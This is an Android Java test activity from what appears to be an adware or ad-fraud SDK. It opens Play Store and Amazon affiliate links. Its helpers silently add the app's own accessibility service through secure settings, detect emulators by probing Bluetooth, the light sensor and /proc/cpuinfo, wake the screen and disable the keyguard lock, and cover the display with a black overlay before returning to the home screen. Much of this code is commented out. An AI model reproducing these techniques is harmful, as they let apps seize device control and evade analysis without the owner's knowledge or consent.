package com.api.utils.test;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Point;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.os.Process;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.widget.TextView;

import com.api.utils.myfb.R;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import static com.api.utils.myfb.BlackActivity.getWindowManagerParams;


/**
 * Created by fj on 2018/10/22.
 */

public class TActivity extends Activity {

    private WindowManager manager;
    private static KeyguardManager.KeyguardLock keyguardLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity);


        /*String aa = null;

        try {
            boolean equals = aa.equals("");
        } catch (Exception e) {
            e.printStackTrace();

            Log.e("sdk", "===="+e.getMessage());
            Log.e("sdk", "===="+e.toString().substring(0,50));
            Log.e("sdk", "===="+e.getLocalizedMessage());
        }

        String rrr = "aaasss";
        if (rrr.length()>6) {
            rrr = rrr.substring(0,6);
        }
        Log.e("sdk", "===="+rrr);
//        Log.e("sdk", "===="+isOnScreen(this));*/

        Log.e("sdk", "====");
//        startAmazonByBrowser(this);


//        boolean b = notHasBlueTooth1(this);
//        boolean aBoolean = notHasLightSensorManager(this);
//
//        boolean nonRoutineCpu = isNonRoutineCpu();
//
//        Log.e("sdk", "notHasBlueTooth1 "+b+" - "+aBoolean+" - "+nonRoutineCpu);

//        boolean b1 = notHasBlueTooth2(this);
//        Log.e("sdk", "===="+b1);


//        String adsenseBannerUrl = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz&referer=aaa";
        String adsenseBannerUrl = "https://play.google.com/store/apps/details?id=com.altm.mknote";
        String id = Uri.parse(adsenseBannerUrl).getQueryParameter("id");
        Log.e("sdk","id2222 -"+ id);

        try {
            this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK).setPackage("com.android.vending"));
        } catch (Exception anfe) {
            Log.e("sdk","Exception -"+anfe.getMessage());
            this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
        }
//        test(this);

       /* RunChecker checker = RunChecker.getInstance(this, new RunChecker.RunCheckImpl(this), null, null);
        boolean b = checker.freedomCheck(null, "startWork ");
        Log.e("sdk", "===== "+b);*/

//        wakeUpAndUnlock(this);

//        String serviceName = this.getPackageName()+ "/" + "com.api.utils.myfb.AutoAccessibilityService";
//        startAutoService(this,serviceName);

    }

    public static void startAutoService(Context context, String clz) {
        if (isAutoServiceOn(context, clz)) {
            Log.i("sdk", "Accessibility is run");
//            String serviceName = context.getPackageName()+ "/" + getAccessibilityService(context);
//            Logger.i(context, "serviceName = " + serviceName + ", clz = " + clz);
//            if (serviceName.equalsIgnoreCase(clz)) {
//                sendAutoAccessibilityBroadcast(context, true);
//            }
            return;
        }
        if (context.checkPermission("android.permission.WRITE_SECURE_SETTINGS", Process.myPid(), Process.myUid()) == PackageManager.PERMISSION_DENIED) {
            Log.i("sdk", "Accessibility not permission");
            return;
        }

        String services = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");

        if (services != null && services.length() > 0) {
            services += ":" + clz;
        } else
            services = clz;

        Settings.Secure.putString(context.getContentResolver(), "enabled_accessibility_services", services);
        Settings.Secure.putInt(context.getContentResolver(), "accessibility_enabled", 1);
    }

    //服务是否开启
    public static boolean isAutoServiceOn(Context context, String serviceName) {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            Log.i("sdk",  "Error finding setting, default accessibility to not found: " + e.getMessage());
            return false;
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    if (accessibilityService.equalsIgnoreCase(serviceName)) {
                        Log.i("sdk",  "We've found the correct setting - accessibility is switched on!");
                        return true;
                    }
                }
            }
        } else {
            Log.i("sdk",  "Accessibility is disabled now");
        }
        return false;
    }

    public static boolean isOnScreen(Context context) {
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        if (Build.VERSION.SDK_INT < 20) {
            return pm.isScreenOn();
        } else {
            return pm.isInteractive();
        }
    }


    public static void startAmazon(Context ctx) {
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("amzn://apps/android?p=com.cyou.cma.clauncher"));
        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(browserIntent);
    }

    public static void startAmazonByBrowser(Context ctx) {
//        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.amazon.com/gp/mas/dl/android?p=com.cyou.cma.clauncher"));
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://amazon.cn?&_encoding=UTF8&tag=mengbao-23&linkCode=ur2&linkId=b027e09eafd410e9190abfa8a4a9d65f&camp=536&creative=3200"));
        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        browserIntent.setPackage("cn.amazon.mShop.android");
        browserIntent.setPackage("com.android.chrome");
//        browserIntent.setClassName("cn.amazon.mShop.android","com.amazon.mShop.splashscreen.StartupActivity");
//        browserIntent.setClassName("com.android.browser","com.android.browser.BrowserActivity");
        ctx.startActivity(browserIntent);

        /*Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        Uri content_url = Uri.parse("http://www.163.com");
        intent.setData(content_url);
        intent.setClassName("com.opera.mini.android", "com.opera.mini.android.Browser");
        ctx.startActivity(intent);*/



    }



    /*public boolean isVirtual(Context context) {
        return notHasBlueTooth1(context) || notHasLightSensorManager(context) || isNonRoutineCpu();
    }

    *//**
     * 判断蓝牙是否有效来判断是否为模拟器
     *
     * @return true 为模拟器
     *//*
    private boolean notHasBlueTooth1(Context context) {
        try {
            Class cl = context.getClassLoader().loadClass("android.bluetooth.BluetoothAdapter");
//            Object ob = invokeCheckMethod(cl, null, "getDefaultAdapter", null);
            Object ob = getInvoke(cl,  "getDefaultAdapter", null, null);
            if (ob == null) {
                return true;
            }
//            Object result = invokeCheckMethod(cl, ob, "getName", null);
////            Object result = getInvoke(cl,  "getName", null, ob);
//
//            if (result == null) {
//                return true;
//            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    *//**
     * 判断是否存在光传感器来判断是否为模拟器
     * 部分真机也不存在温度和压力传感器。其余传感器模拟器也存在。
     * @return true 为模拟器
     *//*
    private boolean notHasLightSensorManager(Context context) {

        try {
//            Class cc = context.getClassLoader().loadClass( $decode1("android.content.Context"));
            Object ob = invokeCheckMethod(Context.class, context,    "getSystemService", new Class[]{String.class},  "sensor");
//            Object ob = getInvoke(Context.class,    "getSystemService", new Class[]{String.class}, context,  "sensor");
            if (ob == null) {
                return true;
            }
            Class cl = context.getClassLoader().loadClass(   "android.hardware.SensorManager");
            Object re = invokeCheckMethod(cl, ob,    "getDefaultSensor", new Class[]{int.class}, 5);
//            Object re = getInvoke(cl,    "getDefaultSensor", new Class[]{int.class}, ob, 5);
            if (re == null) {
                return true;
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    //cpu信息,返回true,为虚拟机
    private static boolean isNonRoutineCpu() {
        String cpuInfo = "";

        try {
            String[] args = new String[]{  "/system/bin/cat",
                     "/proc/cpuinfo"};
            ProcessBuilder cmd = new ProcessBuilder(args);
            Process process = cmd.start();
            StringBuffer sb = new StringBuffer();
            String readLine = "";
            BufferedReader responseReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "utf-8"));

            while((readLine = responseReader.readLine()) != null) {
                sb.append(readLine);
            }

            responseReader.close();
            cpuInfo = sb.toString().toLowerCase();
        } catch (IOException var7) {
            ;
        }
//        String cpuInfo = result;
        return cpuInfo.contains(   "intel")
                || cpuInfo.contains(   "amd");
    }


    public static Object getInvoke(Class<?> cls, String name, Class<?>[] clsArray, Object host, Object... pArray) {
        try {
            Method method = cls.getMethod(name, clsArray);
            method.setAccessible(true);
            return method.invoke(host, pArray);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public Object invokeCheckMethod(Class<?> cl, Object host, String name, Class<?>[] clsArray, Object... pArray) {
        try {
            Method method = cl.getDeclaredMethod(name, clsArray);
            method.setAccessible(true);
            return method.invoke(host, pArray);
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
        return null;
    }


    private boolean notHasBlueTooth2(Context context) {
        try {
            Class cl = context.getClassLoader().loadClass("android.bluetooth.BluetoothAdapter");
            Object ob = invokeCheckMethod(cl, null, "getDefaultAdapter", null);
            if (ob == null) {
                return true;
            }
//            Object result = invokeCheckMethod(cl, ob, "getName", null);
//            if (result == null) {
//                return true;
//            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }


    public void test(final Context context){
//        wakeUpAndUnlock(context);

        *//*manager = (WindowManager) context.getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        final TextView view = new TextView(context);
        view.setBackgroundColor(Color.parseColor("#000000"));

        if (manager == null) {
            return;
        }

        final Display display = manager.getDefaultDisplay();
        Point outPoint = new Point();
        if (Build.VERSION.SDK_INT >= 19) {
            display.getRealSize(outPoint);
        } else {
            display.getSize(outPoint);
        }
        int mRealSizeWidth;//手机屏幕真实宽度
        int mRealSizeHeight;//手机屏幕真实高度
        mRealSizeHeight = outPoint.y;
        mRealSizeWidth = outPoint.x;
        int max = Math.max(mRealSizeWidth, mRealSizeHeight);
        WindowManager.LayoutParams windowManagerParams = getWindowManagerParams(context,max);
        manager.addView(view, windowManagerParams);

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.e("sdk","agian -20");
                if (manager != null) {
                    Log.e("sdk","agian -20 "+view);
                    manager.removeViewImmediate(view);
                }
                backToHome(context);
            }
        },20000);*//*
    }

    //回到桌面
    public static void backToHome(Context context) {
        Intent home=new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(home);
    }

    public static void wakeUpAndUnlock(Context context) {

        // 获取电源管理器对象
        PowerManager pm = (PowerManager) context.getApplicationContext()
                .getSystemService(Context.POWER_SERVICE);
        if (pm == null) {
            return;
        }
        boolean screenOn = pm.isScreenOn();
        if (!screenOn) {
            // 获取PowerManager.WakeLock对象,后面的参数|表示同时传入两个值,最后的是LogCat里用的Tag
            PowerManager.WakeLock wl = pm.newWakeLock(
                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "bright");
            wl.acquire(10000); // 点亮屏幕
            wl.release(); // 释放
        }
        setKeyguardManager(context);

    }

    private static void setKeyguardManager(Context context) {
        // 屏幕解锁
        KeyguardManager keyguardManager = (KeyguardManager) context.getApplicationContext()
                .getSystemService(KEYGUARD_SERVICE);
        if (keyguardManager == null) {
            return;
        }
        keyguardLock = keyguardManager.newKeyguardLock("unLock");
        // 屏幕锁定
        keyguardLock.reenableKeyguard();

        keyguardLock.disableKeyguard(); // 解锁

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.e("sdk", "====10");
                keyguardLock.reenableKeyguard();
                keyguardLock.disableKeyguard(); // 解锁
                keyguardLock.reenableKeyguard();
            }
        },10000);

    }*/
}
